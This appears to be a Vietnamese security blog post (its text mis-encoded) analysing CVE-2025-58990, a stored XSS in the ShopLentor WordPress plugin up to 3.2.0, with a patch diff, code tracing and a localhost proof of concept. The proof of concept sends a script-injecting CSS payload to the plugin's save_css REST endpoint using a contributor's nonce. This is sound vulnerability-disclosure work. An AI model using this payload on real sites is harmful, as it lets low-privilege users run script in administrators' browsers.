---
title: CVE-2025-58990 Analysis & POC
description: Security Vulnerability in WordPress ShopLentor Plugin.
date: 2025-10-05 22:45:00 +0700
categories: [CVE Analysis]
tags: [analyst, plugin, xss]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

Lá»— há»•ng trong plugin **ShopLentor** trÆ°á»›c phiÃªn báº£n **3.2.0** cho phÃ©p káº» táº¥n cÃ´ng cÃ³ quyá»n **contributor** chÃ¨n mÃ£ Ä‘á»™c vÃ o CSS cá»§a block. CSS nÃ y sau Ä‘Ã³ Ä‘Æ°á»£c náº¡p inline vÃ o trang vÃ  cÃ³ kháº£ nÄƒng dáº«n tá»›i Stored XSS khi Ä‘Æ°á»£c preview hoáº·c hiá»ƒn thá»‹ trong trÃ¬nh duyá»‡t.

* **CVE ID**: [CVE-2025-58990](https://www.cve.org/CVERecord?id=CVE-2025-58990)
* **Product**: [WordPress ShopLentor Plugin](https://wordpress.org/plugins/woolentor-addons/)
* **Vulnerability Type**: Cross Site Scripting
* **Affected Versions**: <= 3.2.0
* **CVSS severity**: Low (6.5)
* **Required Privilege**: Contributor

## Requirements

* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **ShopLentor**: v3.2.0(vul) vÃ  v3.2.1(fix)
* **diff tool**: **meld** hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version
* **Actived WooCommerce plugin**: plugin báº¯t buá»™c **actived** trÆ°á»›c khi cÃ i **ShopLentor Plugin**

## Analysis

### Patch Diff

DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡.
CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file **woolentor-blocks/includes/classes/Manage_Styles.php**.

**Báº£n lá»—i**:

```php
public function save_block_css( $request ){
    $params 	= $request->get_params();
    $post_id = sanitize_text_field( $params['post_id'] );

    // KhÃ´ng kiá»ƒm tra quyá»n user
    // KhÃ´ng lá»c ná»™i dung CSS trÆ°á»›c khi lÆ°u
    update_post_meta( $post_id, '_woolentor_css', $params['block_css'] );
    $wp_filesystem->put_contents( $dirname . $filename, $params['block_css'] );
}
```

**Báº£n vÃ¡**:

```php
public function save_block_css( $request ){
    $params 	= $request->get_params();
    $post_id = sanitize_text_field( $params['post_id'] );

    // Chá»‰ admin hoáº·c tÃ¡c giáº£ bÃ i viáº¿t má»›i Ä‘Æ°á»£c phÃ©p
    $post = get_post( $post_id );
    if ( ! $post || ( ! current_user_can('manage_options') &&
        get_current_user_id() !== (int) $post->post_author ) ) {
        return ['success' => false, 'message' => __('No permission')];
    }

    // Lá»c dá»¯ liá»‡u trÆ°á»›c khi lÆ°u
    $block_css = $this->sanitize_css_content( $params['block_css'] );
    update_post_meta( $post_id, '_woolentor_css', $block_css );
    $wp_filesystem->put_contents( $dirname . $filename, $block_css );
}
```

Báº£n vÃ¡ dÃ¹ng `current_user_can(manage_options)` Ä‘á»ƒ kiá»ƒm tra cÃ³ pháº£i **admin** khÃ´ng

* Náº¿u user lÃ  **admin** => váº¿ Ä‘áº§u `! current_user_can('manage_options') = false` => cáº£ biá»ƒu thá»©c `&& = false` => qua Ä‘Æ°á»£c.
* Náº¿u user lÃ  **author** => váº¿ sau `get_current_user_id() !== (int) $post->post_author = false` => cáº£ biá»ƒu thá»©c `&& = false` => qua Ä‘Æ°á»£c.

{{< figure src="patch_diff.png" caption="Patch Diff" >}}

### How It Work?

```php
public function save_block_css( $request ){
    try{
        global $wp_filesystem;
        if ( ! $wp_filesystem || !function_exists('WP_Filesystem') ) {
            require_once( ABSPATH . 'wp-admin/includes/file.php' );
        }

        $params 	= $request->get_params();
        $post_id 	= sanitize_text_field( $params['post_id'] );
        
        if ( $post_id == 'woolentor-widget' && $params['has_block'] ) {
            update_option( $post_id, $params['block_css'] );
            return [
                'success' => true, 
                'message' => __('Widget CSS Saved.', 'woolentor')
            ];
        }

        $filename 		= "woolentor-css-{$post_id}.css";
        $upload_dir_url = wp_upload_dir();
        $dirname 		= trailingslashit( $upload_dir_url['basedir'] ) . 'woolentor-addons/';

        if ( $params['has_block'] ) {
            update_post_meta( $post_id, '_woolentor_active', 'yes' );
            $all_block_css = $params['block_css'];

            WP_Filesystem( false, $upload_dir_url['basedir'], true );
            if( ! $wp_filesystem->is_dir( $dirname ) ) {
                $wp_filesystem->mkdir( $dirname );
            }

            update_post_meta( $post_id, '_woolentor_css', $all_block_css );
            if ( ! $wp_filesystem->put_contents( $dirname . $filename, $all_block_css ) ) {
                throw new \Exception( __('You are not permitted to save CSS.', 'woolentor' ) ); 
            }
            return [
                'success' => true,
                'message' =>__('WooLentor Blocks css file update.', 'woolentor' )
            ];
        } else {
            delete_post_meta( $post_id, '_woolentor_active' );
            if ( file_exists( $dirname.$filename ) ) {
                wp_delete_file( $dirname.$filename );
            }
            delete_post_meta( $post_id, '_woolentor_css' );
            return [
                'success' => true,
                'message' => __('WooLentor Blocks CSS Delete.', 'woolentor' )
            ];
        }
    } catch( \Exception $e ){
        return [
            'success' => false,
            'message' => $e->getMessage()
        ];
    }
}
```

HÃ m `save_block_css()` thuá»™c class `Manage_Styles` cÃ³ nhiá»‡m vá»¥ lÆ°u hoáº·c xÃ³a CSS tuá»³ theo block.

á»¨ng dá»¥ng sáº½ láº¥y `post_id` vÃ  ná»™i dung `block_css` tá»« request.

**TrÆ°á»ng há»£p Ä‘áº·c biá»‡t**: náº¿u `post_id = woolentor-widget` => lÆ°u CSS vÃ o `wp_options`

**TrÆ°á»ng há»£p bÃ i viáº¿t thÆ°á»ng**:

* Náº¿u cÃ³ block (`has_block = true`):

  * ÄÃ¡nh dáº¥u post Ä‘ang active (`_woolentor_active`).
  * LÆ°u CSS vÃ o báº£ng `wp_postmeta` vá»›i `meta_key` lÃ  `_woolentor_css`.

  ```sql
  mysql> select * from wp_postmeta where meta_key='_woolentor_css';
  +---------+---------+----------------+------------+
  | meta_id | post_id | meta_key       | meta_value |
  +---------+---------+----------------+------------+
  |      27 |      69 | _woolentor_css | body:{}    |
  |     687 |    1416 | _woolentor_css | body:{}    |
  +---------+---------+----------------+------------+
  ```

  * Ghi CSS ra file trong thÆ° má»¥c upload (`woolentor-css-{post_id}.css`).

  {{< figure src="write_css.png" caption="Write CSS" >}}

* Náº¿u khÃ´ng cÃ³ block (`has_block = false`):

  * XoÃ¡ tráº¡ng thÃ¡i active vÃ  CSS meta.
  * XoÃ¡ file CSS náº¿u tá»“n táº¡i.

ğŸ‘‰ Kháº£ nÄƒng xáº£y ra lÃ  combo **Stored XSS** phá»• biáº¿n trong plugin WordPress: user role **contributor** (khÃ´ng cÃ³ quyá»n publish) táº¡o post cÃ³ CSS chá»©a payload XSS. Payload nÃ y Ä‘Æ°á»£c lÆ°u trong **database** hoáº·c má»™t **file**; NgÆ°á»i dÃ¹ng cÃ³ Ä‘áº·c quyá»n cao hÆ¡n sáº½ preview (xem trÆ°á»›c) ná»™i dung trÆ°á»›c khi publish, payload sáº½ Ä‘Æ°á»£c táº£i/hiá»ƒn thá»‹ trong trÃ¬nh duyá»‡t vÃ  thá»±c thi, gÃ¢y ra XSS.

Äá»ƒ hiá»ƒu cÃ¡ch dá»¯ liá»‡u Ä‘Æ°á»£c hiá»ƒn thá»‹, ta tÃ¬m vá»›i tá»« khÃ³a `_woolentor_css` trong thÆ° má»¥c plugin. VÃ¬ CSS Ä‘Æ°á»£c lÆ°u trong `wp_postmeta` vá»›i `meta_key = _woolentor_css`, nÃªn cháº¯c cháº¯n plugin sáº½ truy váº¥n giÃ¡ trá»‹ nÃ y vÃ  chÃ¨n trá»±c tiáº¿p vÃ o HTML.

{{< figure src="meta_key.png" caption="Search Meta Key" >}}

`generate_inline_css()` láº¥y block CSS tá»« **wp_postmeta** vá»›i `meta_key = _woolentor_css` vÃ  láº¥y tá»« file `woolentor-css-{$post_id}.css`, náº¿u file tá»“n táº¡i thÃ¬ `get_contents` vÃ  inline CSS cho post cÃ³ `$post_id` Ä‘Æ°á»£c truyá»n vÃ o, cÃ²n náº¿u file khÃ´ng tá»“n táº¡i thÃ¬ láº¥y tá»« **wp_postmeta**.

Ná»™i dung Ä‘Æ°á»£c Ä‘áº·t trong tháº» `<style type="text/css"></style>`

---

class `Manage_Styles` Ä‘Äƒng kÃ½ **REST API** trong hÃ m `register_routes`

```php
public function register_routes( $namespace ){
    register_rest_route( $namespace, 'save_css',
        [
            [
                'methods'  => 'POST', 
                'callback' => [ $this, 'save_block_css' ],
                'permission_callback' => [ $this, 'permission_check' ],
                'args' => []
            ]
        ]
    );
    // other route
}
```

HÃ m `register_rest_route()` táº¡o má»™t **REST API** endpoint táº¡i Ä‘Æ°á»ng dáº«n:

```
/wp-json/{namespace}/save_css
```

Khi cÃ³ request **POST** tá»›i endpoint nÃ y:

* WordPress sáº½ gá»i hÃ m `save_block_css()` Ä‘á»ƒ xá»­ lÃ½ dá»¯ liá»‡u.
* TrÆ°á»›c Ä‘Ã³, `permission_callback` sáº½ cháº¡y hÃ m `permission_check()` Ä‘á»ƒ kiá»ƒm tra quyá»n cá»§a user (náº¿u tráº£ vá» false thÃ¬ cháº·n request).

```php
public function permission_check() {
    if( current_user_can( 'edit_posts' ) ){
        return true;
    }else{
        return false;
    }
}
```

HÃ m `permission_check` quy Ä‘á»‹nh ráº±ng chá»‰ nhá»¯ng user cÃ³ quyá»n **contributor** trá»Ÿ lÃªn má»›i Ä‘Æ°á»£c phÃ©p sá»­ dá»¥ng API nÃ y.

Ta chÆ°a xÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c chÃ­nh xÃ¡c **namespace** á»Ÿ Ä‘Ã¢y lÃ  gÃ¬ vÃ¬ nÃ³ Ä‘Æ°á»£c khai bÃ¡o á»Ÿ Ä‘Ã¢u Ä‘Ã³ trong mÃ£ nguá»“n, khÃ´ng pháº£i trong class nÃ y. Ta táº­n dá»¥ng route `save_css` Ä‘á»ƒ truy váº¿t.

Truy cáº­p `/wp-json/` vÃ  tÃ¬m vá»›i tá»« khÃ³a `save_css`

{{< figure src="search.png" caption="Search" >}}

Káº¿t quáº£ cho tháº¥y endpoint thá»±c táº¿ lÃ :

```http
http://localhost/wp-json/woolentor/v1/save_css
```

Äá»ƒ biáº¿t **namespace** nÃ y Ä‘Æ°á»£c khai bÃ¡o á»Ÿ Ä‘Ã¢u, ta tiáº¿p tá»¥c tÃ¬m trong mÃ£ nguá»“n vá»›i tá»« khÃ³a `'woolentor/v1'`:

{{< figure src="name_space.png" caption="Name Space" >}}

CÃ³ nhiá»u káº¿t quáº£, nhÆ°ng vÃ¬ ta Ä‘ang phÃ¢n tÃ­ch tÃ­nh nÄƒng **REST API**, nÃªn táº­p trung vÃ o file **Api.php**.

`register_routes( $namespace )` thuá»™c class `Manage_Styles` yÃªu cáº§u tham sá»‘ `$namespace` nÃªn cÃ³ thá»ƒ `woolentor/v1` Ä‘Æ°á»£c truyá»n á»Ÿ Ä‘Ã¢y thÃ´ng qua thá»ƒ hiá»‡n cá»§a class gá»i Ä‘áº¿n hÃ m. ta tÃ¬m vá»›i tá»« khÃ³a `Manage_Styles` trong file **Api.php** Ä‘á»ƒ biáº¿t nÃ³ Ä‘Æ°á»£c gá»i nhÆ° váº­y khÃ´ng.

{{< figure src="callapi.png" caption="Call Api" >}}

`namespace` chÃ­nh xÃ¡c Ä‘Æ°á»£c gá»i vÃ  truyá»n nhÆ° váº­y.

ğŸ‘‰ NhÆ° váº­y, khi gá»­i **POST** request Ä‘áº¿n endpoint `http://localhost/wp-json/woolentor/v1/save_css`, callback `save_block_css` Ä‘Æ°á»£c gá»i Ä‘á»ƒ thÃªm/sá»­a block CSS trong file vÃ  database.
Khi truy cáº­p vÃ o post cÃ³ `post_id` liÃªn quan Ä‘áº¿n block CSS Ä‘Æ°á»£c lÆ°u, `generate_inline_css` sáº½ láº¥y ná»™i block CSS vÃ  inline CSS trong tháº» `<style type="text/css"></style>` cá»§a post.

## Exploit

### Detect XSS

Sá»­ dá»¥ng user cÃ³ role **contributor** táº¡o 1 post báº¥t kÃ¬, ghi nhá»› id cá»§a post Ä‘Ã³.

Gá»­i **POST** request Ä‘áº¿n endpoint `http://localhost/wp-json/woolentor/v1/save_css` vá»›i XSS payload

```http
POST /wp-json/woolentor/v1/save_css HTTP/1.1
Host: localhost
Content-Type: application/json

{
"post_id":1416,
"has_block":true,
"block_css":"</style><script>alert(document.domain)</script><style>"
}
```

**Response**

```json
{
    "code":"rest_forbidden",
    "message":"Sorry, you are not allowed to do that.",
    "data":{
        "status":401
    }
}
```

ğŸ‘‰ Thiáº¿u header **X-WP-Nonce** Ä‘á»ƒ phÃ¢n quyá»n ngÆ°á»i dÃ¹ng. Ta má»Ÿ source HTML (<kbd>Ctrl</kbd>+<kbd>U</kbd>) trang chá»‰nh sá»­a bÃ i viáº¿t:

```
view-source:http://localhost/wp-admin/post.php?post=<post_id>&action=edit
```

TÃ¬m `wpApiSettings` trong source vÃ  láº¥y giÃ¡ trá»‹ `nonce`

{{< figure src="api_search.png" caption="wpApiSettings" >}}

Gá»­i request vá»›i **X-WP-Nonce** cÃ³ giÃ¡ trá»‹ vá»«a láº¥y Ä‘Æ°á»£c

```http
POST /wp-json/woolentor/v1/save_css HTTP/1.1
Host: localhost
X-WP-Nonce: f79ec79e4b
Content-Type: application/json

{
"post_id":1416,
"has_block":true,
"block_css":"</style><script>alert(document.domain)</script><style>"
}
```

**Preview post**

{{< figure src="preview.png" caption="Preview" >}}

ğŸ‘‰ XSS thÃ nh cÃ´ng, **inspect** Ä‘á»ƒ xem code Ä‘Æ°á»£c thay Ä‘á»•i nhÆ° nÃ o

**View source code**

{{< figure src="code.png" caption="Code" >}}

## Conclusion

Lá»— há»•ng **CVE-2025-58990** trong plugin **ShopLentor <= 3.2.0** cho phÃ©p **contributor** chÃ¨n CSS Ä‘á»™c háº¡i dáº«n Ä‘áº¿n Stored XSS khi admin/author preview hoáº·c xem post. Báº£n vÃ¡ **3.2.1** bá»• sung kiá»ƒm tra quyá»n vÃ  sanitize CSS, ngÄƒn cháº·n khai thÃ¡c.

**Key takeaways**:

* LuÃ´n káº¿t há»£p **kiá»ƒm tra quyá»n** vÃ  **sanitize** dá»¯ liá»‡u khi xá»­ lÃ½ input tá»« ngÆ°á»i dÃ¹ng.
* CÃ¡c role tháº¥p (nhÆ° **contributor**) váº«n cÃ³ thá»ƒ trá»Ÿ thÃ nh Ä‘iá»ƒm táº¥n cÃ´ng náº¿u API khÃ´ng báº£o vá»‡ Ä‘Ãºng cÃ¡ch.
* **Stored XSS** trong WordPress thÆ°á»ng xuáº¥t hiá»‡n khi dá»¯ liá»‡u Ä‘Æ°á»£c lÆ°u DB/file => render inline mÃ  khÃ´ng lá»c.
* Viá»‡c cáº­p nháº­t plugin ká»‹p thá»i lÃ  biá»‡n phÃ¡p phÃ²ng thá»§ Ä‘Æ¡n giáº£n nhÆ°ng hiá»‡u quáº£ nháº¥t.

## References

[Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

[ WordPress ShopLentor Plugin <= 3.2.0 is vulnerable to Cross Site Scripting (XSS) ](https://patchstack.com/database/wordpress/plugin/ShopLentor/vulnerability/wordpress-ShopLentor-plugin-1-0-5-cross-site-scripting-xss-vulnerability)
